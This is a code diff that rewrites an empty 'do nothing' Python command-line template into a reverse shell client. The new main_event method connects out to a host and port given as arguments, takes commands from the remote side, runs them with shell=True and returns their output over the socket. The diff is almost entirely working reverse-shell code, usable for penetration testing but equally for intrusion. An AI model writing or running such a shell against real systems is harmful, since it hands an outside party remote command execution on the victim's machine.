@@ -23,22 +23,22 @@
 # SOFTWARE.
 
 from argparse import ArgumentParser
-from argparse import FileType
-from configparser import ConfigParser
-import os.path
+import socket
+from sys import exit
+from subprocess import check_output, STDOUT
+from time import sleep
 
 
 __version__ = '0.1'
 
 
-class NothingCore:
+class RSCore:
 
     def __init__(self):
-        """Initialize a total waste of CPU time"""
+        """Initialize the shell client"""
 
         self.args = None
         self.arg_parser = ArgumentParser()
-        self.config = None
 
 
     def get_args(self):
@@ -46,41 +46,51 @@ class NothingCore:
 
         self.arg_parser.add_argument('--version', action = 'version',
                 version = '%(prog)s ' + str(__version__))
-        self.arg_parser.add_argument('-c',
-                action = 'store', dest = 'config',
-                default = '/etc/nothing.conf',
-                help = ('set the config file'))
-        self.arg_parser.add_argument('--full',
-                action = 'store_true',
-                help = ('Do nothing to the fullest'))
-        self.arg_parser.add_argument('files',
-                type = FileType('r'), metavar='FILE', nargs = '?',
-                help = ('set a file with which to do nothing'))
+        self.arg_parser.add_argument('-p',
+                action = 'store_true', dest = 'printcmd',
+                help = ('print received commands'))
+        self.arg_parser.add_argument('host',
+                action = 'store',
+                help = ('set the remote host'))
+        self.arg_parser.add_argument('port',
+                action = 'store', type=int,
+                help = ('set the remote port'))
 
         self.args = self.arg_parser.parse_args()
 
 
-    def get_config(self):
-        """Read the config file"""
-
-        config = ConfigParser()
-        
-        if os.path.isfile(self.args.config):
-            myconf = self.args.config
-            config.read(myconf)
-        else: pass
-
-
     def main_event(self):
-        """Do the actual nothing"""
-        pass
+        """Send a shell to a remote host"""
+        with socket.socket() as s:
+            try:
+                s.connect((self.args.host, self.args.port))
+            except ConnectionRefusedError:
+                print('Error: Connection refused for host '+ self.args.host + \
+                        ' port ' + str(self.args.port) + '.')
+                exit(1)
+        
+            while True:
+                #cmd = str(s.recv(1024))[1:]
+                cmd = str(s.recv(1024))[2:-1]
+                if cmd:
+                    if self.args.printcmd:
+                        print(cmd)
+                    if cmd == 'exit':
+                        s.close()
+                        exit(0)
+                    else:
+                        procoutput = check_output(cmd, shell = True,
+                                stderr=STDOUT)
+                        if procoutput:
+                            s.send(procoutput)
+                else:
+                    sleep(0.1)
 
 
     def run_script(self):
-        """Run the program that does nothing"""
+        """Run the shell client program"""
         try:
             self.get_args()
-            self.get_config()
             self.main_event()
 
         except KeyboardInterrupt:
@@ -88,7 +98,7 @@ class NothingCore:
 
 
 def main():
-    thing = NothingCore()
+    thing = RSCore()
     thing.run_script()
 
 
